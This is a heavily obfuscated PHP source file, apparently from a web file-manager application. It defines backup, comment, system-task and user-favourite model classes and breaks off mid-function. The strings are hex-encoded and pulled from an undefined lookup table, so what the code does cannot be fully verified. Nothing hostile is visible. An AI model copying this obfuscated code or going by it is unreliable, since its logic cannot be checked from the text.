<?php
 goto bí¶êšƒíã; bØã’Öò¸º: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\56\142\141\x63\x6b\165\160\114\151\x73\x74"; public $field = array("\151\x6f", "\x6e\141\x6d\145", "\x73\164\x61\x74\165\163", "\143\157\x6e\164\145\156\164", "\155\x61\156\165\141\x6c", "\x72\145\163\165\x6c\x74", "\164\151\x6d\x65\106\x72\x6f\155", "\164\151\x6d\145\124\x6f"); public function config() { $³û‰ÙÓò =& $_SERVER[ÓïÕü]; Action($³û‰ÙÓò[2031])->taskInit(); $’®Æ¨Ô° = Model($³û‰ÙÓò[861])->get($³û‰ÙÓò[868]); $’®Æ¨Ô° = json_decode($’®Æ¨Ô°, !0); $’®Æ¨Ô° = is_array($’®Æ¨Ô°) ? $’®Æ¨Ô° : array(); $this->parseContent($’®Æ¨Ô°); unset($’®Æ¨Ô°[$³û‰ÙÓò[1775]]); Model($³û‰ÙÓò[1774])->cacheClear(); $–éÁß¯ë = $³û‰ÙÓò[2032]; $ÛïÃÀš‰ = Model($³û‰ÙÓò[2033])->findByKey($³û‰ÙÓò[1793], $–éÁß¯ë); if (!$ÛïÃÀš‰) { $ÛïÃÀš‰ = array(); } if (isset($ÛïÃÀš‰[$³û‰ÙÓò[207]])) { $ÛïÃÀš‰[$³û‰ÙÓò[207]] = json_decode($ÛïÃÀš‰[$³û‰ÙÓò[207]], !0); } if (isset($’®Æ¨Ô°[$³û‰ÙÓò[207]])) { $ÛïÃÀš‰[$³û‰ÙÓò[207]][$³û‰ÙÓò[1778]] = $’®Æ¨Ô°[$³û‰ÙÓò[207]]; unset($’®Æ¨Ô°[$³û‰ÙÓò[207]]); } return array_merge($ÛïÃÀš‰, $’®Æ¨Ô°); } public function listData($ù©ªÃ¿À = false, $Ì¡‰Š´ˆ = "\x6d\x6f\144\x69\x66\171\124\x69\x6d\x65", $€ËßëÄĞ = false) { $áëÍ‰‡œ = parent::listData($ù©ªÃ¿À, $Ì¡‰Š´ˆ, !0); if (!$áëÍ‰‡œ) { return $áëÍ‰‡œ; } if ($ù©ªÃ¿À) { $áëÍ‰‡œ = array($áëÍ‰‡œ); } foreach ($áëÍ‰‡œ as &$º¼¦ƒ·¢) { $this->parseContent($º¼¦ƒ·¢); } return $ù©ªÃ¿À ? $áëÍ‰‡œ[0] : $áëÍ‰‡œ; } public function parseContent(&$‹ù÷†óĞ) { $›¹”ş³Á =& $_SERVER[ÓïÕü]; $€ä¸ñø€ = _get($‹ù÷†óĞ, $›¹”ş³Á[171], $›¹”ş³Á[91]); if (!in_array($€ä¸ñø€, array($›¹”ş³Á[867], $›¹”ş³Á[1236]))) { $‹ù÷†óĞ[$›¹”ş³Á[171]] = $€ä¸ñø€ == $›¹”ş³Á[91] ? $›¹”ş³Á[1236] : $›¹”ş³Á[867]; } } public function lastItem() { $÷Ó¿‰€í = $this->listData(); return !empty($÷Ó¿‰€í[0]) ? $÷Ó¿‰€í[0] : null; } public function kill($Òıíà²ª) { $¸Ã­ó²å =& $_SERVER[ÓïÕü]; $ÀàÇŠ = $this->listData($Òıíà²ª); if (!$ÀàÇŠ || empty($ÀàÇŠ[$¸Ã­ó²å[32]])) { return !0; } Task::kill($¸Ã­ó²å[876]); Task::kill($¸Ã­ó²å[895]); Task::kill($¸Ã­ó²å[905]); $Œà‡×ø = $ÀàÇŠ[$¸Ã­ó²å[32]]; $ş®µì³Â = TEMP_FILES . $¸Ã­ó²å[871] . $Œà‡×ø . $¸Ã­ó²å[8]; IO::remove($ş®µì³Â, !1); return $this->remove($Òıíà²ª); } public function remove($ˆé¢†¥ª) { $­ªµ™ã¢ = $this->listData($ˆé¢†¥ª); if (!$­ªµ™ã¢) { return !0; } return $this->backupRemove($­ªµ™ã¢); } private function backupRemove($Ö–‘¸û) { parent::remove($Ö–‘¸û[$_SERVER[ÓïÕü][478]]); $Üô½ÆüÂ = $this->backupPath($Ö–‘¸û); IO::remove($Üô½ÆüÂ, !1); return !0; } private function backupPath($°Œˆú”‡) { $ú‘™£¢Š =& $_SERVER[ÓïÕü]; $·¶ÄÚ = $°Œˆú”‡[$ú‘™£¢Š[32]]; $ò«§ˆâì = Model($ú‘™£¢Š[861])->get($ú‘™£¢Š[862]); $Öä‰÷ì™ = substr(md5($ú‘™£¢Š[863] . $ò«§ˆâì . $·¶ÄÚ), 0, 8); return "\x7b\151\x6f\72{$°Œˆú”‡[$ú‘™£¢Š[843]]}\175\x2f\144\141\x74\141\x62\141\163\x65\57\x62\x61\x63\153\x75\160\57" . $·¶ÄÚ . $ú‘™£¢Š[11] . $Öä‰÷ì™; } public function start() { $Ù—²œÎÖ =& $_SERVER[ÓïÕü]; if ($GLOBALS[$Ù—²œÎÖ[6]][$Ù—²œÎÖ[92]][$Ù—²œÎÖ[2034]] != $Ù—²œÎÖ[91]) { return !0; } $¢–¶‚è‰ = $this->config(); if (!$¢–¶‚è‰ || $¢–¶‚è‰[$Ù—²œÎÖ[1775]] != $Ù—²œÎÖ[91]) { return !1; } if ($¢–¶‚è‰[$Ù—²œÎÖ[171]] == $Ù—²œÎÖ[867]) { $ƒÔûµ = Model($Ù—²œÎÖ[861])->get($Ù—²œÎÖ[1352]); if ($ƒÔûµ == $Ù—²œÎÖ[1353]) { $¢–¶‚è‰[$Ù—²œÎÖ[171]] = $Ù—²œÎÖ[1236]; } } $Å…¯“Ã— = $this->process(); foreach ($Å…¯“Ã— as $¶ê•„”) { if ($¶ê•„”) { return Task::restart($¶ê•„”[$Ù—²œÎÖ[478]]); } } $×¸­™é¶ = new Backup(); $¸ÛíÎÊ› = $×¸­™é¶->db(); if ($¸ÛíÎÊ›) { $¸ÛíÎÊ› = $×¸­™é¶->dbFile(); if ($¸ÛíÎÊ› && $¢–¶‚è‰[$Ù—²œÎÖ[171]] == $Ù—²œÎÖ[867]) { $¸ÛíÎÊ› = $×¸­™é¶->file(); } } Backup::set(array($Ù—²œÎÖ[841] => 1, $Ù—²œÎÖ[852] => time())); return !0; } public function process() { $Ô¡èŒ“ =& $_SERVER[ÓïÕü]; $ÜåƒÙËØ = array($Ô¡èŒ“[848] => Task::get($Ô¡èŒ“[876]), $Ô¡èŒ“[853] => Task::get($Ô¡èŒ“[895]), $Ô¡èŒ“[233] => Task::get($Ô¡èŒ“[905])); $¬ÂìíÕê = !1; foreach ($ÜåƒÙËØ as &$Èûıâ‹±) { if ($¬ÂìíÕê) { $Èûıâ‹± = !1; continue; } if ($Èûıâ‹±) { $œÍ‡ÄäØ = intval(_get($Èûıâ‹±, $Ô¡èŒ“[1811], 0)); if (time() - $œÍ‡ÄäØ > 7200) { Task::kill($Èûıâ‹±[$Ô¡èŒ“[478]]); $¬ÂìíÕê = !0; $Èûıâ‹± = !1; } } } return $ÜåƒÙËØ; } public function restore() { $¥ÙÑ–‘² =& $_SERVER[ÓïÕü]; ActionCall($¥ÙÑ–‘²[1164], !0, 1); ActionCall($¥ÙÑ–‘²[1164], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\155\155\145\x6e\164"; protected $tableMeta = array("\164\x61\x62\154\145\116\x61\155\x65" => "\x63\x6f\155\x6d\145\156\164\x5f\x6d\145\x74\x61", "\155\145\164\141\x46\151\145\x6c\144" => "\143\157\155\155\145\x6e\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($¬›Êˆö) { $£¹Úô§” =& $_SERVER[ÓïÕü]; if ($¬›Êˆö[$£¹Úô§”[2035]]) { $ˆòíîÓ  = $this->where(array($£¹Úô§”[2036] => $¬›Êˆö[$£¹Úô§”[2035]]))->find(); if (!$ˆòíîÓ  || $ˆòíîÓ [$£¹Úô§”[191]] != $¬›Êˆö[$£¹Úô§”[191]] || $ˆòíîÓ [$£¹Úô§”[574]] != $¬›Êˆö[$£¹Úô§”[574]]) { return !1; } $this->where(array($£¹Úô§”[2036] => $¬›Êˆö[$£¹Úô§”[2035]]))->setAdd($£¹Úô§”[2037], 1); } $¬›Êˆö[$£¹Úô§”[2038]] = 0; $¬›Êˆö[$£¹Úô§”[2037]] = 0; $¬›Êˆö[$£¹Úô§”[841]] = 1; return $this->add($¬›Êˆö); } public function commentCount($Â×†ğ«, $ì®§×è¢, $Öµ‘üşÛ = false) { $“ƒ“’İÆ =& $_SERVER[ÓïÕü]; if (!$Â×†ğ«) { return array(); } if (is_string($Â×†ğ«) || is_int($Â×†ğ«)) { $Â×†ğ« = array($Â×†ğ«); } $¯»î–¼á = array($“ƒ“’İÆ[574], $“ƒ“’İÆ[2039] => $“ƒ“’İÆ[570]); $”»¿Õà = array($“ƒ“’İÆ[574] => array($“ƒ“’İÆ[7], $Â×†ğ«), $“ƒ“’İÆ[191] => $ì®§×è¢); if ($Öµ‘üşÛ) { $”»¿Õà[$“ƒ“’İÆ[1806]] = $Öµ‘üşÛ; } $òÕšØ”ş = $this->field($¯»î–¼á)->where($”»¿Õà)->group($“ƒ“’İÆ[574])->select(); return array_to_keyvalue($òÕšØ”ş, $“ƒ“’İÆ[574], $“ƒ“’İÆ[570]); } public function starTarget($ÇÍÁ§šé, $´‹¡Öå ) { $ê¨¡ò¬ =& $_SERVER[ÓïÕü]; $ø÷ãƒ‘© = $ÇÍÁ§šé + self::TYPE_STAR_OFFSET; $Å°ÌéÊ = array($ê¨¡ò¬[1806] => USER_ID, $ê¨¡ò¬[191] => $ø÷ãƒ‘©, $ê¨¡ò¬[574] => $´‹¡Öå ); $—¦¸¡æ = $this->where($Å°ÌéÊ)->find(); if ($—¦¸¡æ) { return $this->where(array($ê¨¡ò¬[478] => $—¦¸¡æ[$ê¨¡ò¬[478]]))->delete(); } $ç¶”Êí‘ = array($ê¨¡ò¬[2035] => 0, $ê¨¡ò¬[1806] => USER_ID, $ê¨¡ò¬[841] => 1, $ê¨¡ò¬[171] => $ê¨¡ò¬[12], $ê¨¡ò¬[191] => $ø÷ãƒ‘©, $ê¨¡ò¬[574] => $´‹¡Öå , $ê¨¡ò¬[2038] => 0, $ê¨¡ò¬[2037] => 0); return $this->add($ç¶”Êí‘); } public function starTargetCount($ìì·ˆí, $Ú¿Üçñ) { $æ·©»µĞ =& $_SERVER[ÓïÕü]; $ÜÅÄú€Õ = $Ú¿Üçñ + self::TYPE_STAR_OFFSET; $çíâ…Â’ = $this->commentCount($ìì·ˆí, $ÜÅÄú€Õ); $›µÃÑ² = $this->commentCount($ìì·ˆí, $ÜÅÄú€Õ, USER_ID); return array($æ·©»µĞ[2040] => $çíâ…Â’, $æ·©»µĞ[2041] => $›µÃÑ²); } public function starTargetUserList($¼ƒÕ¹ßÚ, $»Ë¤ıœÙ) { $âÖß¨ =& $_SERVER[ÓïÕü]; $…­Í°ß© = $¼ƒÕ¹ßÚ + self::TYPE_STAR_OFFSET; $ÃöÊÌèŞ = array($âÖß¨[574] => $»Ë¤ıœÙ, $âÖß¨[191] => $…­Í°ß©); $åâŞ‡óõ = $this->where($ÃöÊÌèŞ)->count(); $ò ¤©˜İ = array($âÖß¨[335] => $åâŞ‡óõ, $âÖß¨[2042] => array()); if (!$åâŞ‡óõ) { return $ò ¤©˜İ; } $‡á¢Î = $this->field($âÖß¨[1806])->where($ÃöÊÌèŞ)->limit(500)->select(); $‡á¢Î = array_to_keyvalue($‡á¢Î, $âÖß¨[12], $âÖß¨[1806]); $ò ¤©˜İ[$âÖß¨[2042]] = Model($âÖß¨[582])->userListInfo($‡á¢Î); return $ò ¤©˜İ; } public function prasiseUserList($Õ¶Š·æ) { $®ˆ›É‰Ó =& $_SERVER[ÓïÕü]; $™áÆÀè» = array($®ˆ›É‰Ó[2043] => $Õ¶Š·æ); $È“¨Şæ¨ = $this->where($™áÆÀè»)->find(); $ÌÈ«µ²² = _get($È“¨Şæ¨, $®ˆ›É‰Ó[2038], 0); $¯Ÿ’ª’ß = array($®ˆ›É‰Ó[335] => $ÌÈ«µ²², $®ˆ›É‰Ó[2042] => array()); if (!$ÌÈ«µ²²) { return $¯Ÿ’ª’ß; } $½úóå± = Model($®ˆ›É‰Ó[2044])->field($®ˆ›É‰Ó[1806])->where($™áÆÀè»)->limit(500)->select(); $½úóå± = array_to_keyvalue($½úóå±, $®ˆ›É‰Ó[12], $®ˆ›É‰Ó[1806]); $¯Ÿ’ª’ß[$®ˆ›É‰Ó[2042]] = Model($®ˆ›É‰Ó[582])->userListInfo($½úóå±); return $¯Ÿ’ª’ß; } public function remove($Ş¿­ùùà) { $»¥Ö¼ =& $_SERVER[ÓïÕü]; $Š“¹ÒÕ = array($»¥Ö¼[2036] => $Ş¿­ùùà); $àü´³¯Š = $this->where($Š“¹ÒÕ)->find(); if ($àü´³¯Š[$»¥Ö¼[2035]]) { $this->where(array($»¥Ö¼[2036] => $àü´³¯Š[$»¥Ö¼[2035]]))->setAdd($»¥Ö¼[2037], -1); } return $this->where($Š“¹ÒÕ)->delete(); } public function edit($îİˆ¨ñœ, $Ôéı¡ÏŒ) { $¥àøüÈ =& $_SERVER[ÓïÕü]; $ëÈœªÚ× = array($¥àøüÈ[2036] => $îİˆ¨ñœ); return $this->where($ëÈœªÚ×)->save(array($¥àøüÈ[2045] => $Ôéı¡ÏŒ)); } public function prasise($Şüî‚Ğ©) { $¥Œ¿µéö =& $_SERVER[ÓïÕü]; $€ÀôéÅà = Model($¥Œ¿µéö[2046]); $™©¶ş½¹ = array($¥Œ¿µéö[2036] => $Şüî‚Ğ©, $¥Œ¿µéö[1797] => USER_ID); $ñŒ‡ë¡ı = $€ÀôéÅà->where($™©¶ş½¹)->find(); if (!$ñŒ‡ë¡ı) { $€ÀôéÅà->add($™©¶ş½¹); $Ïïóõ¸Ö = $this->where(array($¥Œ¿µéö[2036] => $Şüî‚Ğ©))->setAdd($¥Œ¿µéö[2038], 1); } else { $€ÀôéÅà->where($™©¶ş½¹)->delete(); $Ïïóõ¸Ö = $this->where(array($¥Œ¿µéö[2036] => $Şüî‚Ğ©))->setAdd($¥Œ¿µéö[2038], -1); } return $Ïïóõ¸Ö; } public function targetInfo($¡Á¼´¨Ñ, $Ë€Õ¤ëÖ) { $ôÂÏìöµ =& $_SERVER[ÓïÕü]; $Í÷¦ÌĞ = array($ôÂÏìöµ[656] => $¡Á¼´¨Ñ, $ôÂÏìöµ[657] => $Ë€Õ¤ëÖ); $—Í¿œø = $this->where($Í÷¦ÌĞ)->count(); $Çå·ë–œ = "\122\x49\107\x48\124\x20\112\x4f\x49\116\x20{$this->tablePrefix}\143\x6f\x6d\155\x65\156\164\137\x70\x72\141\x69\x73\145\40\163\x74\x61\x72\40\x6f\x6e\40\x63\x6f\x6d\x6d\x65\x6e\164\x2e\x63\x6f\155\x6d\145\156\x74\111\104\40\x3d\x20\163\164\x61\x72\56\x63\157\x6d\x6d\x65\x6e\x74\111\104"; $•øŠ½£Ï = $this->alias($ôÂÏìöµ[432])->where($Í÷¦ÌĞ)->join($Çå·ë–œ, $ôÂÏìöµ[2047])->count(); $¥ÄÍ±ìï = array($ôÂÏìöµ[2048] => $—Í¿œø, $ôÂÏìöµ[2049] => $•øŠ½£Ï); return $¥ÄÍ±ìï; } public function listData($¦¸ş±­š) { $ı”ùÆÙÎ =& $_SERVER[ÓïÕü]; if (isset($¦¸ş±­š[$ı”ùÆÙÎ[2050]])) { if ($¦¸ş±­š[$ı”ùÆÙÎ[2050]]) { $¦¸ş±­š[$ı”ùÆÙÎ[2043]] = array($ı”ùÆÙÎ[1118], intval($¦¸ş±­š[$ı”ùÆÙÎ[2050]])); } unset($¦¸ş±­š[$ı”ùÆÙÎ[2050]]); } if (isset($¦¸ş±­š[$ı”ùÆÙÎ[2051]])) { if ($¦¸ş±­š[$ı”ùÆÙÎ[2051]]) { $¦¸ş±­š[$ı”ùÆÙÎ[2043]] = array($ı”ùÆÙÎ[1115], intval($¦¸ş±­š[$ı”ùÆÙÎ[2051]])); } unset($¦¸ş±­š[$ı”ùÆÙÎ[2051]]); } return $this->_listData($¦¸ş±­š); } private function _listData($ä•»Õ¬) { $Î“èï‘Ï =& $_SERVER[ÓïÕü]; $µ»Ù×• = $this->where($ä•»Õ¬)->_makeOrder()->selectPage(100); $this->_listAppendParent($µ»Ù×•[$Î“èï‘Ï[448]]); $this->_listAppendUser($µ»Ù×•[$Î“èï‘Ï[448]]); $this->_listAppendMeta($µ»Ù×•[$Î“èï‘Ï[448]]); return $µ»Ù×•; } private function _makeOrder() { $²–ğõé¯ =& $_SERVER[ÓïÕü]; $ùÄäàé = array($²–ğõé¯[2038], $²–ğõé¯[2037], $²–ğõé¯[234]); $‘ÄÜªü = Input::get($²–ğõé¯[533], $²–ğõé¯[7], $²–ğõé¯[500], $ùÄäàé); $«›é£Î¥ = Input::get($²–ğõé¯[534], $²–ğõé¯[7], $²–ğõé¯[1799], array($²–ğõé¯[2052], $²–ğõé¯[529])); $¼Ä¶Ó§ğ = $‘ÄÜªü . $²–ğõé¯[53] . $«›é£Î¥; return $this->order($¼Ä¶Ó§ğ); } private function _listAppendParent(&$ÁÚ½) { $Š¦£©ê =& $_SERVER[ÓïÕü]; $ÏŠÅÌƒü = array_unique(array_to_keyvalue($ÁÚ½, $Š¦£©ê[12], $Š¦£©ê[2035])); $ÏŠÅÌƒü = array_remove_value($ÏŠÅÌƒü, $Š¦£©ê[231]); if (!$ÏŠÅÌƒü) { return; } $ØƒªÛ±¥ = $this->where(array($Š¦£©ê[2036] => array($Š¦£©ê[7], $ÏŠÅÌƒü)))->select(); $ØƒªÛ±¥ = array_to_keyvalue($ØƒªÛ±¥, $Š¦£©ê[2043]); foreach ($ÁÚ½ as &$åò€±Ü) { if (isset($ØƒªÛ±¥[$åò€±Ü[$Š¦£©ê[2035]]])) { $åò€±Ü[$Š¦£©ê[2053]] = $ØƒªÛ±¥[$åò€±Ü[$Š¦£©ê[2035]]]; } } unset($åò€±Ü); } private function _listAppendUser(&$«­ñÖéà) { $ƒ‘´çé =& $_SERVER[ÓïÕü]; $‰ ¿¬Éó = array_unique(array_to_keyvalue($«­ñÖéà, $ƒ‘´çé[12], $ƒ‘´çé[1806])); $‰ ¿¬Éó = array_remove_value($‰ ¿¬Éó, $ƒ‘´çé[231]); if (count($‰ ¿¬Éó) == 0) { return; } foreach ($«­ñÖéà as $˜¼‹Ğ©») { if (isset($˜¼‹Ğ©»[$ƒ‘´çé[2053]])) { $‰ ¿¬Éó[] = $˜¼‹Ğ©»[$ƒ‘´çé[2053]][$ƒ‘´çé[1806]]; } } $úÆÄİÜñ = Model($ƒ‘´çé[602])->userListInfo($‰ ¿¬Éó); foreach ($«­ñÖéà as &$˜¼‹Ğ©») { $˜¼‹Ğ©»[$ƒ‘´çé[670]] = $úÆÄİÜñ[$˜¼‹Ğ©»[$ƒ‘´çé[1806]]]; if (isset($˜¼‹Ğ©»[$ƒ‘´çé[2053]])) { $˜¼‹Ğ©»[$ƒ‘´çé[2053]][$ƒ‘´çé[670]] = $úÆÄİÜñ[$˜¼‹Ğ©»[$ƒ‘´çé[2053]][$ƒ‘´çé[1806]]]; } } unset($˜¼‹Ğ©»); } private function _listAppendMeta(&$ÔØÄ“ÓÑ) { $ãªìòóÃ =& $_SERVER[ÓïÕü]; $æÁ—•¦ = array_unique(array_to_keyvalue($ÔØÄ“ÓÑ, $ãªìòóÃ[12], $ãªìòóÃ[2043])); $æÁ—•¦ = array_remove_value($æÁ—•¦, $ãªìòóÃ[231]); if (!$æÁ—•¦) { return; } foreach ($ÔØÄ“ÓÑ as $üæÀÀ‡Ç) { if (isset($üæÀÀ‡Ç[$ãªìòóÃ[2053]])) { $æÁ—•¦[] = $üæÀÀ‡Ç[$ãªìòóÃ[2053]][$ãªìòóÃ[2043]]; } } $İãê½Ï¢ = $this->metaList($æÁ—•¦); if (!$İãê½Ï¢) { return !1; } foreach ($ÔØÄ“ÓÑ as &$üæÀÀ‡Ç) { $üæÀÀ‡Ç[$ãªìòóÃ[544]] = $İãê½Ï¢[$üæÀÀ‡Ç[$ãªìòóÃ[2043]]]; if (isset($üæÀÀ‡Ç[$ãªìòóÃ[2053]])) { $üæÀÀ‡Ç[$ãªìòóÃ[2053]][$ãªìòóÃ[544]] = $İãê½Ï¢[$üæÀÀ‡Ç[$ãªìòóÃ[2053]][$ãªìòóÃ[2043]]]; } } unset($üæÀÀ‡Ç); } private function metaList($ö‚ÌÃÙÏ) { $Ã‹®İÖ =& $_SERVER[ÓïÕü]; if (!$ö‚ÌÃÙÏ) { return array(); } $É¥Îó–» = array($Ã‹®İÖ[2043] => array($Ã‹®İÖ[7], $ö‚ÌÃÙÏ)); $öËÙÚ¾ä = Model($Ã‹®İÖ[2054])->where($É¥Îó–»)->select(); $öËÙÚ¾ä = array_to_keyvalue_group($öËÙÚ¾ä, $Ã‹®İÖ[2043]); foreach ($öËÙÚ¾ä as $à÷¾ıÑ¹ => $ºøÏŞ¸¨) { $àîñòâÃ = array(); foreach ($ºøÏŞ¸¨ as $™³ÈÆñ) { $àîñòâÃ[$™³ÈÆñ[$Ã‹®İÖ[97]]] = $™³ÈÆñ[$Ã‹®İÖ[453]]; } $öËÙÚ¾ä[$à÷¾ıÑ¹] = $àîñòâÃ; } return $öËÙÚ¾ä ? $öËÙÚ¾ä : array(); } public function removeTarget($ÈãÑ›°Ş, $ËÒè‹¿Á) { $±ÛÈ¢º“ =& $_SERVER[ÓïÕü]; if (!$ËÒè‹¿Á) { return !0; } $ËÒè‹¿Á = is_array($ËÒè‹¿Á) ? $ËÒè‹¿Á : array($ËÒè‹¿Á); $¦¬æı«Ê = array($±ÛÈ¢º“[191] => $ÈãÑ›°Ş, $±ÛÈ¢º“[574] => array($±ÛÈ¢º“[7], $ËÒè‹¿Á)); $¦ó¶¦Û½ = $this->field($±ÛÈ¢º“[2043])->where($¦¬æı«Ê)->select(); $­á¼Œ±¾ = array_to_keyvalue($¦ó¶¦Û½, $±ÛÈ¢º“[12], $±ÛÈ¢º“[2043]); if (!$­á¼Œ±¾) { return !0; } $¦¬æı«Ê = array($±ÛÈ¢º“[2043] => array($±ÛÈ¢º“[7], $­á¼Œ±¾)); $this->where($¦¬æı«Ê)->delete(); Model($±ÛÈ¢º“[2046])->where($¦¬æı«Ê)->delete(); Model($±ÛÈ¢º“[2055])->where($¦¬æı«Ê)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\137\146\151\x6c\x65\137\143\157\x6e\x74\x65\x6e\164\163"; protected $dataAuto = array(array("\143\162\x65\141\x74\145\x54\151\x6d\x65", "\164\x69\x6d\x65", "\x69\156\163\x65\x72\164", "\x66\165\x6e\143\164\151\x6f\156")); } goto F÷¤ó²›£˜; eèËÁ¼“Í×: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\56\164\141\x73\x6b\114\x69\163\x74"; public $field = array("\x6e\x61\x6d\x65", "\164\x79\x70\x65", "\x65\166\145\x6e\x74", "\164\151\x6d\145", "\144\x65\x73\143", "\x73\x79\163\x74\145\155", "\145\x6e\x61\x62\154\x65", "\x6c\141\163\164\x52\165\x6e", "\x73\x6f\x72\x74"); public function listData($ä°½„¬æ = false, $Èà˜ß®³ = "\x73\157\x72\164", $“éã…÷ï = false) { return parent::listData($ä°½„¬æ, $Èà˜ß®³, $“éã…÷ï); } public function add($»š£¨ŠÜ) { $˜Ù¸ö§İ =& $_SERVER[ÓïÕü]; $•†µ‡•Ç = $this->findByName($»š£¨ŠÜ[$˜Ù¸ö§İ[32]]); if ($•†µ‡•Ç) { return !1; } $»š£¨ŠÜ[$˜Ù¸ö§İ[1756]] = 0; $»š£¨ŠÜ[$˜Ù¸ö§İ[2030]] = $this->getSort(); return parent::insert($»š£¨ŠÜ); } private function getSort() { $½Û‚Å¬ =& $_SERVER[ÓïÕü]; $’ÌÜÂò‘ = parent::listData(); $ä—ÀÜ£Õ = array_to_keyvalue($’ÌÜÂò‘, $½Û‚Å¬[12], $½Û‚Å¬[2030]); return empty($ä—ÀÜ£Õ) ? 0 : max($ä—ÀÜ£Õ) + 1; } public function update($ñË—Û€ö, $õÀ§ñˆ™) { $¸ÇÚ  =& $_SERVER[ÓïÕü]; $©”§¦ÁÍ = $this->listData($ñË—Û€ö); $–«Ííãî = $this->findByName($õÀ§ñˆ™[$¸ÇÚ [32]]); if (!$©”§¦ÁÍ || $–«Ííãî && $–«Ííãî[$¸ÇÚ [478]] != $©”§¦ÁÍ[$¸ÇÚ [478]]) { return !1; } return parent::update($ñË—Û€ö, $õÀ§ñˆ™); } public function remove($œ¹¼û·, $åÚÊÆÏÓ = false) { $¡’‚¼Î =& $_SERVER[ÓïÕü]; $¨÷Úë­¥ = $this->listData($œ¹¼û·); if (!$¨÷Úë­¥) { return; } if (!$åÚÊÆÏÓ && $¨÷Úë­¥[$¡’‚¼Î[192]] == $¡’‚¼Î[91]) { return !1; } return parent::remove($œ¹¼û·); } public function enable($Ñ¶Úã’¼, $Õ¿Õğ×ú) { return $this->update($Ñ¶Úã’¼, array($_SERVER[ÓïÕü][2485] => $Õ¿Õğ×ú)); } public function run($ïêë‹ÏÁ) { return $this->update($ïêë‹ÏÁ, array($_SERVER[ÓïÕü][2497] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\146\141\x76"; protected function cacheFunctionAlias($ı¢Ñçìä) { $éÑÛ³¨‹ =& $_SERVER[ÓïÕü]; return array($éÑÛ³¨‹[2122] => array(USER_ID, $éÑÛ³¨‹[2498])); } protected function listData() { $‚şÚË…¾ =& $_SERVER[ÓïÕü]; $Ï¯¬¸Ü = array($‚şÚË…¾[1797] => USER_ID, $‚şÚË…¾[562] => 0); $¿âÛ³«Š = $‚şÚË…¾[2499]; $ãüê‡¶ = $this->field($¿âÛ³«Š)->where($Ï¯¬¸Ü)->order($‚şÚË…¾[2500])->select(); return $ãüê‡¶ ? $ãüê‡¶ : array(); } protected function resetCache() { } protected function listView() { $£ìå¢Û• =& $_SERVER[ÓïÕü]; $¨É­¶ İ = $this->listData(); $¦Õß¿û¼ = array_filter_by_field($¨É­¶ İ, $£ìå¢Û•[33], $£ìå¢Û•[493]); $î†ÄìŸá = array_to_keyvalue($¦Õß¿û¼, $£ìå¢Û•[12], $£ìå¢Û•[87]); if (!$î†ÄìŸá) { return $¨É­¶ İ; } $ “¼‡á§ = 2000; $¼˜„¼¸» = array($£ìå¢Û•[494] => array($£ìå¢Û•[495], $î†ÄìŸá)); $Ø¤Ì¹´ï = Model($£ìå¢Û•[921])->listSource($¼˜„¼¸», $ “¼‡á§); $Ø¤Ì¹´ï = array_merge($Ø¤Ì¹´ï[$£ìå¢Û•[86]], $Ø¤Ì¹´ï[$£ìå¢Û•[85]]); $Ø¤Ì¹´ï = array_to_keyvalue($Ø¤Ì¹´ï, $£ìå¢Û•[194]); foreach ($¨É­¶ İ as $ööÅÕô => $Ä˜†™ù) { $—Øâµá = $Ø¤Ì¹´ï[$Ä˜†™ù[$£ìå¢Û•[87]]]; $—Øâµá = $—Øâµá ? $—Øâµá : array(); $¨É­¶ İ[$ööÅÕô] = array_merge($—Øâµá, $Ä˜†™ù); } return $¨É­¶ İ; } protected function addFav($ª”†ø§É, $«úµ†‡– = '', $ÀÔÇèÚ = "\163\157\x75\162\143\x65") { $ÈÂÜ„¿ñ =& $_SERVER[ÓïÕü]; $£„ö¨ = array($ÈÂÜ„¿ñ[1797] => USER_ID, $ÈÂÜ„¿ñ[562] => 0, $ÈÂÜ„¿ñ[499] => $ÀÔÇèÚ, $ÈÂÜ„¿ñ[498] => $ª”†ø§É); if ($this->where($£„ö¨)->find()) { return !1; } $£„ö¨ = array($ÈÂÜ„¿ñ[1797] => USER_ID, $ÈÂÜ„¿ñ[562] => 0); $¢àœàßÒ = $this->where($£„ö¨)->max($ÈÂÜ„¿ñ[2030]); if (!$¢àœàßÒ) { $¢àœàßÒ = 0; } if (!$«úµ†‡– && $ÀÔÇèÚ == $ÈÂÜ„¿ñ[493]) { $Ïš…Íõ€ = Model($ÈÂÜ„¿ñ[1456])->where(array($ÈÂÜ„¿ñ[494] => $ª”†ø§É))->find(); if (!$Ïš…Íõ€) { return !1; } $«úµ†‡– = $Ïš…Íõ€[$ÈÂÜ„¿ñ[32]]; } $«úµ†‡– = $this->getAutoName($«úµ†‡–); $ûÓ×Ä·İ = array($ÈÂÜ„¿ñ[1797] => USER_ID, $ÈÂÜ„¿ñ[562] => 0, $ÈÂÜ„¿ñ[497] => $«úµ†‡–, $ÈÂÜ„¿ñ[498] => $ª”†ø§É, $ÈÂÜ„¿ñ[499] => $ÀÔÇèÚ, $ÈÂÜ„¿ñ[2010] => $¢àœàßÒ + 1); return $this->add($ûÓ×Ä·İ); } protected function remove($åáÒœ® ) { $ÛÑóÍİÂ =& $_SERVER[ÓïÕü]; $ä›Á²•™ = array($ÛÑóÍİÂ[1797] => USER_ID, $ÛÑóÍİÂ[496] => $åáÒœ® ); return $this->where($ä›Á²•™)->delete(); } protected function removeByName($¢º‹œ‰µ) { $æ¼ƒ¿È =& $_SERVER[ÓïÕü]; $ÛÅßÄÃÉ = array($æ¼ƒ¿È[1797] => USER_ID, $æ¼ƒ¿È[497] => $¢º‹œ‰µ, $æ¼ƒ¿È[562] => 0); return $this->where($ÛÅßÄÃÉ)->delete(); } protected function rename($©Ğş“, $Ú•š§­Œ) { $‡”ªÀì¹ =& $_SERVER[ÓïÕü]; if ($©Ğş“ == $Ú•š§­Œ) { return !1; } $’‹©”Ñ¢ = 